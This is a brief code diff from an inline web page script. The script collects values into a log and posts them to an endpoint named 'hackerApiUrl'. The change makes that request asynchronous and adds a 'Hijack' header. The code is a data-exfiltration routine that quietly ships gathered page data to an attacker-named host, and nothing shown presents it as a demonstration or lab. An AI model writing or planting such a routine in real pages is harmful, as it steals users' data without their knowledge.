@@ -14,7 +14,8 @@
 				log[i+1] = value;
 			}
 			var xhr = new XMLHttpRequest();
-			xhr.open('post', hackerApiUrl);
+			xhr.open('post', hackerApiUrl, true);
+			xhr.setRequestHeader('Hijack', 'important data');
 			xhr.send(log);
 		}
 	</script>
